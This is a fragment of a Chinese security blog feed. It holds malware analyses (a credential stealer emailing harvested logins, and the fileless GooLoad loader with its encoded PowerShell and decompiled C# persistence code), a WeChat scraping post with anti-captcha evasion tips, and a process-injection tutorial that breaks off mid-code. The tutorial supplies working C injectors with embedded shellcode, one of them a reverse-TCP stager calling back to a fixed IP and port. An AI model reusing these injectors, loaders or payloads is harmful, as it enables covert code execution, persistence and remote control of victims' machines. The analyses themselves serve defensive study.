&quot;fc&quot;))            {                RegSvcs.regConfig.InstallationFlags |= InstallationFlags.FindOrCreateTargetApplication;            }            else if (RegSvcs.IsArgument(args[i], &quot;exapp&quot;))            {                RegSvcs.regConfig.InstallationFlags &amp;= ~(InstallationFlags.CreateTargetApplication | InstallationFlags.FindOrCreateTargetApplication);            }            else if (RegSvcs.IsArgument(args[i], &quot;extlb&quot;))            {                RegSvcs.regConfig.InstallationFlags |= InstallationFlags.ExpectExistingTypeLib;            }            else if (RegSvcs.IsPrefixArgument(args[i], &quot;tlb&quot;, ref text))            {                RegSvcs.regConfig.TypeLibrary = text;            }            else if (RegSvcs.IsArgument(args[i], &quot;reconfig&quot;))            {                RegSvcs.regConfig.InstallationFlags |= InstallationFlags.ReconfigureExistingApplication;            }            else if (RegSvcs.IsArgument(args[i], &quot;noreconfig&quot;))            {                RegSvcs.regConfig.InstallationFlags &amp;= ~InstallationFlags.ReconfigureExistingApplication;            }            else if (RegSvcs.IsArgument(args[i], &quot;nologo&quot;))            {                RegSvcs.logoOutput = false;            }            else if (RegSvcs.IsArgument(args[i], &quot;quiet&quot;))            {                RegSvcs.regConfig.InstallationFlags &amp;= ~InstallationFlags.ReportWarningsToConsole;                RegSvcs.logoOutput = false;                RegSvcs.successOutput = false;            }            else if (RegSvcs.IsArgument(args[i], &quot;u&quot;))            {                RegSvcs.uninstallApplication = true;            }            else if (RegSvcs.IsArgument(args[i], &quot;componly&quot;))            {                RegSvcs.regConfig.InstallationFlags |= InstallationFlags.ConfigureComponentsOnly;            }            else if (RegSvcs.IsPrefixArgument(args[i], &quot;appname&quot;, ref text))            {                RegSvcs.regConfig.Application = text;            }            else if (RegSvcs.IsPrefixArgument(args[i], &quot;parname&quot;, ref text))            {                RegSvcs.regConfig.Partition = text;            }            else if (RegSvcs.IsPrefixArgument(args[i], &quot;appdir&quot;, ref text))            {                RegSvcs.regConfig.ApplicationRootDirectory = text;            }            else            {                if (args[i].StartsWith(&quot;/&quot;, StringComparison.Ordinal) || args[i].StartsWith(&quot;-&quot;, StringComparison.Ordinal))                {                    throw new UsageException(1, Resource.FormatString(&quot;RegSvcs_InvalidOption&quot;, args[i]));                }                break;            }        }        if (i &gt; args.Length)        {            throw new UsageException(1);        }        int num = args.Length - i;        if (num == 0)        {            throw new UsageException(1, Resource.FormatString(&quot;RegSvcs_NotEnoughArgs&quot;));        }        if (num == 1)        {            RegSvcs.regConfig.AssemblyFile = args[i];            return;        }        if (num == 2)        {            RegSvcs.regConfig.AssemblyFile = args[i];            RegSvcs.regConfig.Application = args[i + 1];            RegSvcs.regConfig.TypeLibrary = null;            return;        }        if (num == 3)        {            RegSvcs.regConfig.AssemblyFile = args[i];            RegSvcs.regConfig.Application = args[i + 1];            RegSvcs.regConfig.TypeLibrary = args[i + 2];            return;        }        throw new UsageException(1, Resource.FormatString(&quot;RegSvcs_ToManyArgs&quot;));    }    // Token: 0x04000002 RID: 2    private const int MAX_PATH = 260;    // Token: 0x04000003 RID: 3    private static RegistrationConfig regConfig = new RegistrationConfig();    // Token: 0x04000004 RID: 4    private static bool logoOutput;    // Token: 0x04000005 RID: 5    private static bool successOutput;    // Token: 0x04000006 RID: 6    private static bool uninstallApplication;}</code></pre><p>看了一下连接信息：<br>先发送了一个Auth的请求头进行验证</p><pre><code>解码:info@stankovic.hr</code></pre><p><img src="https://z3.ax1x.com/2021/04/14/cybeRP.png" alt=""></p><p>验证成功后会收集本机信息进行上传(发送到邮箱)<br><img src="https://z3.ax1x.com/2021/04/14/cybUMT.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/04/14/cybBdJ.png" alt=""></p><pre><code>MIME-Version: 1.0From: info@stankovic.hrTo: info@stankovic.hrDate: 28 Jul 2020 20:46:04 +0100Subject: PW_admin/USER-PCContent-Type: text/html; charset=us-asciiContent-Transfer-Encoding: quoted-printableTime: 07/28/2020 20:45:57User Name: adminComputer Name: U=SER-PCOSFullName: Microsoft Windows 7 ProfessionalCPU: I=ntel(R) Core(TM) i5-6400 CPU @ 2.70GHzRAM: 3583.61 MB&lt;hr&gt;=URL:192.168.1.10D=0AUsername:honey@pot.com0D=0APassword=:honeypass3560D=0AApplication:Outlook0D=0A&lt;hr&gt;=0D=0AURL=:https://m.facebook.com/0D=0AUsername:honey@pot.com0D=0A=Password:honeypass3560D=0AApplication:Chrome0D=0A&lt;hr&gt;=0D=0A=URL:https://m.facebook.com0D=0AUsername:honey@pot.com0D=0A=Password:honeypass3560D=0AApplication:Firefox0D=0A&lt;hr&gt;=0D=0A</code></pre><p>还有一些功能需要详细分析，感觉需要HOOK才能更好的分析….</p><p>MD5:1A25E75693B99AD09E55AEA29C6F2775<br>IOC:<br>89.201.175.36</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;继续学习样本分析&lt;br&gt;原YouTube视频分析：&lt;a href=&quot;https://www.youtube.com/watch?v=deG_-5opR30&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.youtube.com/wat</summary>
      
    
    
    
    
    <category term="恶意分析" scheme="http://422926799.github.io/tags/恶意分析/"/>
    
  </entry>
  
  <entry>
    <title>无文件GooLoad静态分析</title>
    <link href="http://422926799.github.io/posts/9d2ce0c6.html"/>
    <id>http://422926799.github.io/posts/9d2ce0c6.html</id>
    <published>2021-04-12T09:33:30.000Z</published>
    <updated>2021-04-12T11:51:24.291Z</updated>
    
    <content type="html"><![CDATA[<p>Youtube分析视频:<a href="https://www.youtube.com/watch?v=BcFbkjUVc7o" target="_blank" rel="noopener">https://www.youtube.com/watch?v=BcFbkjUVc7o</a><br>样本下载地址:<a href="https://bazaar.abuse.ch/sample/6bb71d8bf32cceef6a431136e0c965aa905c45c240b40bb20aa6fb6f661300f3" target="_blank" rel="noopener">https://bazaar.abuse.ch/sample/6bb71d8bf32cceef6a431136e0c965aa905c45c240b40bb20aa6fb6f661300f3</a></p><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>md5:1766EFD0E682B405C2A49613DD1B4D81<br>sha1:6A8644B0A41B471D21476FDE2D2C07599943BF55<br>sha256:8D39AA47F437C37451A7D249E5EEE77D1BE6C00C95FAD82D69C119A734F5F4B3</p><p>拿到的是个js，启动用wscript启动。js内容如下<br><img src="https://z3.ax1x.com/2021/04/12/cDuuJx.png" alt=""></p><p>丢到<code>https://lelinhtinh.github.io/de4js/</code>美化一下代码<br><img src="https://z3.ax1x.com/2021/04/12/cDuqt1.png" alt=""></p><p>执行流程如下:<br>1.首先是获取当前用户名称，创建了一个注册表路径:<code>HKEY_CURRENT_USER\SOFTWARE\&lt;USERNAME&gt;</code><br>2.读取ocwbowtyl变量的值长度到4000的时候写入<code>HKEY_CURRENT_USER\SOFTWARE\&lt;USERNAME&gt;\&lt;ltrjrmhvifoz&gt;</code><br>3.写入<code>HKEY_CURRENT_USER\SOFTWARE\&lt;USERNAME&gt;\&lt;ltrjrmhvifoz&gt; value:&lt;gzmttsouj&gt; type:REG_SZ</code><br>4.创建注册表路径<code>HKEY_CURRENT_USER\SOFTWARE\&lt;%USERNAME%1&gt;</code><br>5.gzmttsouj赋值znahht<br>6.读取gzmttsouj变量的值长度到4000的时候写入<code>HKEY_CURRENT_USER\SOFTWARE\&lt;USERNAME&gt;\&lt;ltrjrmhvifoz&gt;</code><br>7.写入<code>HKEY_CURRENT_USER\SOFTWARE\&lt;USERNAME&gt;\&lt;ltrjrmhvifoz&gt; value:&lt;gzmttsouj&gt; type:REG_SZ</code><br>8.判断文件夹(<code>C:\Program Files (x86)</code>)是否存在，决定采用那个powershell执行<br>9.执行powershell command</p><p><img src="https://z3.ax1x.com/2021/04/12/cDKHKS.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/04/12/cDKxCq.png" alt=""></p><p>执行的powershell command<br><img src="https://z3.ax1x.com/2021/04/12/cDMTiR.png" alt=""></p><p>解码如下<br><img src="https://z3.ax1x.com/2021/04/12/cDQRfI.png" alt=""></p><pre><code class="powershell">#cmd /c C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -En &quot;PAAjACAAdQB2AHgAdgByAGwAIAAjAD4AJAB1AD0AJABlAG4AdgA6AFUAcwBlAHIATgBhAG0AZQA7AGYAbwByACAAKAAkAGkAPQAwADsAJABpACAALQBsAGUAIAA3ADAAMAA7ACQAaQArACsAKQB7ACQAYwA9ACIASABLAEMAVQA6AFwAUwBPAEYAVABXAEEAUgBFAFwAIgArACQAdQArACIAMQAiADsAVAByAHkAewAkAGEAPQAkAGEAKwAoAEcAZQB0AC0ASQB0AGUAbQBQAHIAbwBwAGUAcgB0AHkAIAAtAHAAYQB0AGgAIAAkAGMAKQAuACQAaQB9AEMAYQB0AGMAaAB7AH0AfQA7AGYAdQBuAGMAdABpAG8AbgAgAGMAaABiAGEAewBbAGMAbQBkAGwAZQB0AGIAaQBuAGQAaQBuAGcAKAApAF0AcABhAHIAYQBtACgAWwBwAGEAcgBhAG0AZQB0AGUAcgAoAE0AYQBuAGQAYQB0AG8AcgB5AD0AJAB0AHIAdQBlACkAXQBbAFMAdAByAGkAbgBnAF0AJABoAHMAKQA7ACQAQgB5AHQAZQBzACAAPQAgAFsAYgB5AHQAZQBbAF0AXQA6ADoAbgBlAHcAKAAkAGgAcwAuAEwAZQBuAGcAdABoACAALwAgADIAKQA7AGYAbwByACgAJABpAD0AMAA7ACAAJABpACAALQBsAHQAIAAkAGgAcwAuAEwAZQBuAGcAdABoADsAIAAkAGkAKwA9ADIAKQB7ACQAQgB5AHQAZQBzAFsAJABpAC8AMgBdACAAPQAgAFsAYwBvAG4AdgBlAHIAdABdADoAOgBUAG8AQgB5AHQAZQAoACQAaABzAC4AUwB1AGIAcwB0AHIAaQBuAGcAKAAkAGkALAAgADIAKQAsACAAMQA2ACkAfQAkAEIAeQB0AGUAcwB9ADsAJABpACAAPQAgADAAOwBXAGgAaQBsAGUAIAAoACQAVAByAHUAZQApAHsAJABpACsAKwA7ACQAawBvACAAPQAgAFsAbQBhAHQAaABdADoAOgBTAHEAcgB0ACgAJABpACkAOwBpAGYAIAAoACQAawBvACAALQBlAHEAIAAxADAAMAAwACkAewAgAGIAcgBlAGEAawB9AH0AWwBiAHkAdABlAFsAXQBdACQAYgAgAD0AIABjAGgAYgBhACgAJABhAC4AcgBlAHAAbABhAGMAZQAoACIAIwAiACwAJABrAG8AKQApADsAWwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKAAkAGIAKQA7AFsATQBvAGQAZQBdADoAOgBTAGUAdAB1AHAAKAApADsA &quot; &lt; # uvxvrl # &gt;$u = $env:UserName;for ($i = 0;$i  - le 700;$i++) {    $c = &quot;HKCU:\SOFTWARE\&quot;+$u+&quot;1&quot;;    Try{        $a=$a+(Get-ItemProperty -path $c).$i #获取KCU:\SOFTWARE\&lt;USERNAME&gt;1的所有的键值    }Catch{    }};function chba{    #转换为二进制数据    [cmdletbinding()]param([parameter(Mandatory=$true)][String]$hs);    $Bytes = [byte[]]::new($hs.Length / 2);    for($i=0; $i -lt $hs.Length; $i+=2){        $Bytes[$i/2] = [convert]::ToByte($hs.Substring($i, 2), 16)    }    $Bytes};$i = 0;While ($True){    $i++;    $ko = [math]::Sqrt($i);    if ($ko -eq 1000){         break    }}[byte[]]$b = chba($a.replace(&quot;#&quot;, $ko)); #将&quot;#&quot;替换为1000 1000对应十六进制为NULL[Reflection.Assembly]::Load($b); #远程加载[Mode]::Setup();</code></pre><p>powershell执行流程:<br>1.获取<code>KCU:\SOFTWARE\&lt;USERNAME&gt;1的所有的键值</code><br>2.获取到内容将#替换为1000<br>3.远程加载执行<br>4.调用远程加载里的<code>setup</code>函数</p><p>提取znahht变量的内容，将#替换为1000.十六进制解码，丢进dnSpy分析</p><p>md5:404280229BFDBE01D751BCE03210F75E<br>sha1:098B332B7A4F8712916D6A681799E390DAAAEF98<br>sha256:BFFA7EC58ABF9F4AB9940C1633EF86484DFC1425326EC247699BBB2D1C6E45A9</p><p>得到的结果如下</p><pre><code class="csharp">// Mode// Token: 0x06000002 RID: 2 RVA: 0x00002104 File Offset: 0x00000304public static string Setup(){    RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(&quot;SOFTWARE\\&quot; + Environment.UserName); //读取HKCU\SOFTWARE\&lt;USERNAME&gt;    if (registryKey != null)    {        string text = &quot;&quot;;        for (int i = 0; i &lt; 99999; i++)        {            string text2 = &quot;&quot;;            try            {                text2 = registryKey.GetValue(i.ToString()).ToString(); //读取从0到99999键名的键值            }            catch            {            }            if (text2.Length == 0)            {                break;            }            text += text2;        }        registryKey.Close(); //关闭注册表        text = text.Replace(&quot;q&quot;, &quot;000&quot;).Replace(&quot;v&quot;, &quot;0&quot;).Replace(&quot;w&quot;, &quot;1&quot;).Replace(&quot;r&quot;, &quot;2&quot;).Replace(&quot;t&quot;, &quot;3&quot;).Replace(&quot;y&quot;, &quot;4&quot;).Replace(&quot;u&quot;, &quot;5&quot;).Replace(&quot;i&quot;, &quot;6&quot;).Replace(&quot;o&quot;, &quot;7&quot;).Replace(&quot;p&quot;, &quot;8&quot;).Replace(&quot;s&quot;, &quot;9&quot;).Replace(&quot;q&quot;, &quot;A&quot;).Replace(&quot;h&quot;, &quot;B&quot;).Replace(&quot;j&quot;, &quot;C&quot;).Replace(&quot;k&quot;, &quot;D&quot;).Replace(&quot;l&quot;, &quot;E&quot;).Replace(&quot;z&quot;, &quot;F&quot;); //将q替换为000，将v替换为0，将w替换为1，将t替换为3，将y替换为4，将u替换为5，将i替换为6，将o替换为7，将p替换为8，将s替换为9，将q替换为A，将h替换为B，将j替换为C，将k替换为D，将l替换为E，将z替换为F        byte[] rawAssembly = Mode.STBA(text); //hex转换得到原始数据        Assembly assembly = Assembly.Load(rawAssembly); //远程加载        Type type = assembly.GetType(&quot;Diagnostics&quot;); //调用Diagnostics        object obj = Activator.CreateInstance(type);        MethodInfo method = type.GetMethod(&quot;Time&quot;);        method.Invoke(obj, null);        using (RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey(&quot;SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce&quot;, true)) //打开HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce注册表        {            string str = Environment.UserName.Replace(&quot; &quot;, &quot;&quot;); //将本机用户名的空格替换为空            registryKey2.SetValue(Environment.UserName, &quot;powershell -Win Hi -Command \&quot;$r = [Environment]::GetEnvironmentVariable(&#39;&quot; + str + &quot;&#39;, &#39;User&#39;).split();$p=$r[0];$r[0]=&#39;&#39;;Start-Process $p -ArgumentList ($r -join &#39; &#39;) -Win Hi\&quot;&quot;); //当前用户作为键名        }        using (RegistryKey registryKey3 = Registry.CurrentUser.OpenSubKey(&quot;Environment&quot;, true)) //打开HKCU\Environment        {            string text3 = Environment.CommandLine; //获取此过程的命令行(由于是在powershell远程加载的所以这里获取到的是powershell.exe的路径)            if (!text3.Contains(&quot;windowstyle&quot;))            {                text3 = text3.Replace(&quot;.exe &quot;, &quot;.exe -windowstyle hidden &quot;); //执行的命令行存在windowstyle将.exe替换为.exe -windowstyle hidden[空格]            }            registryKey3.SetValue(Environment.UserName.Replace(&quot; &quot;, &quot;&quot;), text3);        }    }    return &quot;Install&quot;;}// Mode// Token: 0x06000001 RID: 1 RVA: 0x00002098 File Offset: 0x00000298public static byte[] STBA(string hex){    return (from x in Enumerable.Range(0, hex.Length)    where x % 2 == 0    select Convert.ToByte(hex.Substring(x, 2), 16)).ToArray&lt;byte&gt;(); //hex转换}</code></pre><p>md5:FD5B538D2523FEA19D7C11C4159A7EB6<br>sha1:5620A43E87ADB4517AA7181825612CFD7491AF3A<br>sha256:BBE6F87ECBA0F6452C6A7F3A81B6DBEB23787C754439BC979CAF653DC594B606</p><p>1.读取读取HKCU\SOFTWARE\<username>从0到99999键名的键值<br>2.将q替换为000，将v替换为0，将w替换为1，将t替换为3，将y替换为4，将u替换为5，将i替换为6，将o替换为7，将p替换为8，将s替换为9，将q替换为A，将h替换为B，将j替换为C，将k替换为D，将l替换为E，将z替换为F<br>3.hex转换得到原始数据<br>4.远程加载<br>5.调用Diagnostics.Time()<br>6.将此ps1的路径添加到启动路径HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce</username></p><p>ocwbowtyl变量值hex解码还原dnSpy分析<br><img src="https://z3.ax1x.com/2021/04/12/cDNy0x.png" alt=""></p><p>分析结果为cs实现的傀儡进程（注入:C:\Program Files (x86)\Windows Photo Viewer\ImagingDevices.exe）<br><img src="https://z3.ax1x.com/2021/04/12/cDN4cd.png" alt=""></p><p>如果失败的话则会杀掉进程<br><img src="https://z3.ax1x.com/2021/04/12/cDNqN8.png" alt=""></p><p>提取注入的PE<br><img src="https://z3.ax1x.com/2021/04/12/cDNX9g.png" alt=""></p><p>ps:提取出来后<code>\s</code>替换为空。然后hex解码，得到PE<br><img src="https://z3.ax1x.com/2021/04/12/cDUPEV.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/04/12/cDUtKA.png" alt=""></p><p>丢沙箱了没见到上线，IDA看了一下也没出什么有用的。具体不知<br><img src="https://z3.ax1x.com/2021/04/12/cD0O6e.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Youtube分析视频:&lt;a href=&quot;https://www.youtube.com/watch?v=BcFbkjUVc7o&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.youtube.com/watch?v=BcFbkjUV</summary>
      
    
    
    
    
    <category term="恶意分析" scheme="http://422926799.github.io/tags/恶意分析/"/>
    
  </entry>
  
  <entry>
    <title>爬取微信公众号小结</title>
    <link href="http://422926799.github.io/posts/3dedb035.html"/>
    <id>http://422926799.github.io/posts/3dedb035.html</id>
    <published>2021-04-11T04:36:54.000Z</published>
    <updated>2021-04-11T05:23:45.191Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>一直想爬微信公众号然后整成一个bot。试过好几次<br>最终都以失败告终。昨天折腾了一晚上，利用搜狗的微信爬取弄好了</p><h2 id="爬取的方法"><a href="#爬取的方法" class="headerlink" title="爬取的方法"></a>爬取的方法</h2><p>网上能搜到的爬取方法：</p><ul><li>微信公众号平台接口抓取|限制:微信KEY有限制，30-40分钟内就会过期。请求次数超过10-20次被封</li><li>搜狗公众号爬取 | 缺陷：只能获取公众号最新更新的一条文章</li></ul><h2 id="爬取实现"><a href="#爬取实现" class="headerlink" title="爬取实现"></a>爬取实现</h2><p>这里是用第二种方法，方法如下<br>搜狗微信公众号搜索对应公众号:<code>https://weixin.sogou.com/weixin?type=1&amp;query=bibacps&amp;ie=utf8</code><br>获取文章链接<br><img src="https://z3.ax1x.com/2021/04/11/cwUusx.png" alt=""></p><p>然后请求这个链接得到wx文章的链接<br><img src="https://z3.ax1x.com/2021/04/11/cwU2yq.png" alt=""></p><p>经过测试，发现并无cookie等效验。访问<code>https://weixin.sogou.com/&lt;sougou_wx_lnk&gt;</code>就可以获取wx文章url。但是，请求次数太多就会出现验证码，只有cookie对了才不会有验证码<br>google后得到解决方法：</p><ul><li>随机UA头</li><li>每次请求之前先获取搜狗子域名cookie</li></ul><p>参考链接:<a href="https://blog.csdn.net/weixin_43881394/article/details/107768458" target="_blank" rel="noopener">https://blog.csdn.net/weixin_43881394/article/details/107768458</a></p><p>获取子域名cookie</p><pre><code class="python">import requestsdef getcookie():    #从搜狗视频获取cookie，防止傻逼搜狗机制检测    url = &#39;https://v.sogou.com/v?ie=utf8&amp;query=&amp;p=40030600&#39;    headers = {&#39;User-Agent&#39;: UserAgent().random}    rst = requests.get(url=url,headers=headers,allow_redirects=False)    cookies = rst.cookies.get_dict()    return cookies</code></pre><p>爬取到wx文章链接后入库</p><p>最终效果如下<br><img src="https://z3.ax1x.com/2021/04/11/cw0RCF.png" alt=""></p><p>Github:<a href="https://github.com/422926799/note/tree/master/%E8%87%AA%E5%B7%B1%E5%86%99%E7%9A%84%E5%B7%A5%E5%85%B7/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7%E7%88%AC%E5%8F%96" target="_blank" rel="noopener">https://github.com/422926799/note/tree/master/%E8%87%AA%E5%B7%B1%E5%86%99%E7%9A%84%E5%B7%A5%E5%85%B7/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7%E7%88%AC%E5%8F%96</a></p><h2 id="爬虫小技巧"><a href="#爬虫小技巧" class="headerlink" title="爬虫小技巧"></a>爬虫小技巧</h2><pre><code>爬取大型站点（例如:google.com）可能会遇到的问题：    * 请求次数过多导致验证码    * Cookie判断是否多次请求解决发方法    * 随机IP代理    * 随机UA头    * SESSION请求    * 针对Cookie判断是否多次请求 （这种大型站点cookie生成机制都是一致的，可以请求这种站点的子域名获取cookie。每次请求之前，先从子域名获取cookie然后在用这个cookie请求要爬取的站点）    * 延时请求遇见CSRF TOKEN效验    * TOKEN效验    * COOKIE效验解决方法：    * 这种CRSF TOKEN一般在当前页面存在TOKEN，先获取TOKEN在去请求指定某个地区的IP请求解决方法：    * 使用对应地区的IP请求</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;一直想爬微信公众号然后整成一个bot。试过好几次&lt;br&gt;最终都以失败告终。昨天折腾了一晚上，利用搜狗的微信爬取弄好了&lt;/p&gt;
&lt;h2 id=</summary>
      
    
    
    
    
    <category term="爬虫" scheme="http://422926799.github.io/tags/爬虫/"/>
    
  </entry>
  
  <entry>
    <title>傀儡进程</title>
    <link href="http://422926799.github.io/posts/96bf6a75.html"/>
    <id>http://422926799.github.io/posts/96bf6a75.html</id>
    <published>2021-04-06T15:29:53.000Z</published>
    <updated>2021-04-06T15:36:34.641Z</updated>
    
    <content type="html"><![CDATA[<p><strong>shellcode插入</strong><br>x64<br>整体流程：<br>1.创建进程，获取进程句柄 CreateProcessA<br>2.在目标进程分配shellcode大小的内存空间 VirtualAllocEx<br>3.远程写入shellcode WriteProcessMemory<br>4.远程线程调用 CreateRemoteThread<br>5.等待返回 WaitForSingleObject<br>6.减少线程的挂起计数。当挂起计数减为零时，将继续执行线程。 ResumeThread</p><p>ps:其实这个不算最多算个线程劫持</p><pre><code class="c">#include &quot;stdafx.h&quot;#include &lt;Windows.h&gt;int main(){        unsigned char buf[] =               &quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52&quot;               &quot;\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48&quot;               &quot;\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9&quot;               &quot;\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41&quot;               &quot;\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48&quot;               &quot;\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01&quot;               &quot;\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48&quot;               &quot;\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0&quot;               &quot;\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c&quot;               &quot;\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0&quot;               &quot;\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04&quot;               &quot;\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59&quot;               &quot;\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48&quot;               &quot;\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00&quot;               &quot;\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f&quot;               &quot;\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff&quot;               &quot;\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb&quot;               &quot;\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c&quot;               &quot;\x63\x2e\x65\x78\x65\x00&quot;;        SIZE_T size = 0;        STARTUPINFOEXA si;        PROCESS_INFORMATION pi;        ZeroMemory(&amp;si, sizeof(si));        si.StartupInfo.cb = sizeof(STARTUPINFOEXA);        si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;        ZeroMemory(&amp;pi, sizeof(pi));        BOOL sucess = CreateProcessA(NULL, &quot;C:\\Windows\\System32\\notepad.exe&quot;, NULL,  NULL, true, CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL,  (LPSTARTUPINFOA)&amp;si, &amp;pi);        HANDLE notepadHandle = pi.hProcess;        LPVOID remotebuffer = VirtualAllocEx(notepadHandle, NULL, sizeof(buf),  (MEM_RESERVE | MEM_COMMIT),PAGE_EXECUTE_READWRITE);        WriteProcessMemory(notepadHandle,remotebuffer,buf,sizeof(buf),NULL);        HANDLE remoteThread = CreateRemoteThread(notepadHandle, NULL, 0,  (LPTHREAD_START_ROUTINE)remotebuffer, NULL, 0, NULL); //remotebuffer为线程起始地址        if (WaitForSingleObject(remoteThread, INFINITE) == WAIT_FAILED) {               return 1;        }        if (ResumeThread(pi.hThread) == -1) {               return 1;        }    return 0;}</code></pre><p><img src="https://z3.ax1x.com/2021/04/06/c3naLQ.png" alt=""></p><p>x86<br>寻找加载基地址，在加载基地址前运行shellcode：<br>1.挂起方式创建进程 CreateProcessA<br>2.获取线程里的PEB GetThreadContext<br>3.获取进程基地址保存在EAX ReadProcessMemory<br>4.在基地址之前写入shellcode WriteProcessMemory<br>5.恢复线程执行 ResumeThread</p><pre><code class="c">#include &quot;stdafx.h&quot;#include &lt;Windows.h&gt;unsigned char buf[] =&quot;\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30&quot;&quot;\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff&quot;&quot;\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52&quot;&quot;\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1&quot;&quot;\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b&quot;&quot;\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03&quot;&quot;\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b&quot;&quot;\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24&quot;&quot;\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb&quot;&quot;\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c&quot;&quot;\x77\x26\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54&quot;&quot;\x50\x68\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x5d\x8d&quot;&quot;\x68\x02\x00\x11\x5c\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50&quot;&quot;\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5&quot;&quot;\x74\x61\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67&quot;&quot;\x00\x00\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff&quot;&quot;\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00&quot;&quot;\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56&quot;&quot;\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58&quot;&quot;\x68\x00\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5&quot;&quot;\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85&quot;&quot;\x70\xff\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6\x75\xc1&quot;&quot;\xc3\xbb\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5&quot;;void test() {        STARTUPINFOA si;        PROCESS_INFORMATION pi;        ZeroMemory(&amp;si, sizeof(si));        ZeroMemory(&amp;pi, sizeof(pi));        si.cb = sizeof(STARTUPINFOA);        if (!CreateProcessA(&quot;C:\\Windows\\sysWoW64\\svchost.exe&quot;, NULL, NULL, NULL, FALSE,  CREATE_SUSPENDED, NULL, NULL, &amp;si, &amp;pi)) {               printf(&quot;CreateProcess Error Code:%d\n&quot;, GetLastError());               return;        }        printf(&quot;CreateProcess Sucess\n&quot;);        CONTEXT ctx;        ctx.ContextFlags = CONTEXT_ALL;        if (!GetThreadContext(pi.hThread, &amp;ctx)) {               